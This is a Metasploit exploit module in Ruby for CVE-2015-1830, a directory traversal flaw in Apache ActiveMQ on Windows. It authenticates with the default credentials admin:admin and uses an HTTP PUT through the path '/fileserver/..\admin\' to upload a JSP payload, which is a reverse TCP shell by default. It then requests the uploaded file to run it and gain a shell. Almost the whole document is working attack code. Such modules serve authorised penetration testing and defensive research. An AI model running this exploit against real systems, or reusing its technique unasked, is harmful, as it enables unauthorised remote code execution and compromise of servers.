# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache
        ActiveMQ 5.x before 5.11.2 for Windows.

        The module tries to upload a JSP payload to the /admin directory via the traversal
        path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ
        credentials admin:admin (or other credentials provided by the user). It then issues
        an HTTP GET request to /admin/<payload>.jsp on the target in order to trigger the
        payload and obtain a shell.
      },
      &#039;Author&#039;          =>
        [
          &#039;David Jorm&#039;,     # Discovery and exploit
          &#039;Erik Wynter&#039;     # @wyntererik - Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-1830&#039; ],
          [ &#039;EDB&#039;, &#039;40857&#039;],
          [ &#039;URL&#039;, &#039;https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;    => %w{ win },
      &#039;Targets&#039;     =>
        [
          [ &#039;Windows Java&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;2015-08-19&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DefaultOptions&#039;  => {
        &#039;RPORT&#039; => 8161,
        &#039;PAYLOAD&#039; => &#039;java/jsp_shell_reverse_tcp&#039;
        },
      &#039;DefaultTarget&#039;  => 0))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the web application&#039;, &#039;/&#039;]),
      OptString.new(&#039;PATH&#039;,      [true, &#039;Traversal path&#039;, &#039;/fileserver/..\\admin\\&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;Username to authenticate with&#039;, &#039;admin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to authenticate with&#039;, &#039;admin&#039;])
    ])
  end

  def check
    print_status("Running check...")
    testfile = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, datastore[&#039;PATH&#039;], "#{testfile}.jsp"),
      &#039;headers&#039;     => {
        &#039;Authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
        },
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;data&#039;      => "<% out.println(\"#{testcontent}\");%>"
    })

    res1 = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      &#039;headers&#039;     => {
        &#039;Authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
        },
      &#039;method&#039;    => &#039;GET&#039;
    })

    if res1 && res1.body.include?(testcontent)
      send_request_cgi(
        opts = {
          &#039;uri&#039;       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
          &#039;headers&#039;     => {
            &#039;Authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
            },
          &#039;method&#039;    => &#039;DELETE&#039;
        },
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading payload...")
    testfile = Rex::Text::rand_text_alpha(10)
    vprint_status("If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.

    send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, datastore[&#039;PATH&#039;], "#{testfile}.jsp"),
      &#039;headers&#039;     => {
        &#039;Authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
        },
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;data&#039;      => payload.encoded
    })

    print_status("Payload sent. Attempting to execute the payload.")
    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      &#039;headers&#039;     => {
        &#039;Authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
      },
      &#039;method&#039;    => &#039;GET&#039;
    })
    if res && res.code == 200
      print_good("Payload executed!")
    else
      fail_with(Failure::PayloadFailed, "Failed to execute the payload")
    end
  end
end

